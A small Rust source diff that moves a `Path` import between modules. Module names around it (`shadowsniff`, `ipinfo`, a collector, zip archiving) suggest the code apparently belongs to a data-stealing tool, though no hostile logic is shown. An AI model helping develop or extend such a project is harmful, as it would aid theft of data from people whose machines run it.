@@ -9,6 +9,7 @@ extern crate alloc;
 use alloc::format;
 use collector::atomic::AtomicCollector;
 use collector::DisplayCollector;
+use filesystem::path::Path;
 use filesystem::storage::StorageFileSystem;
 use filesystem::virtualfs::VirtualFileSystem;
 use filesystem::{FileSystem, FileSystemExt};
@@ -16,7 +17,6 @@ use ipinfo::init_ip_info;
 use shadowsniff::SniffTask;
 use tasks::Task;
 use utils::log_debug;
-use utils::path::Path;
 use zip::ZipArchive;
 
 mod panic;
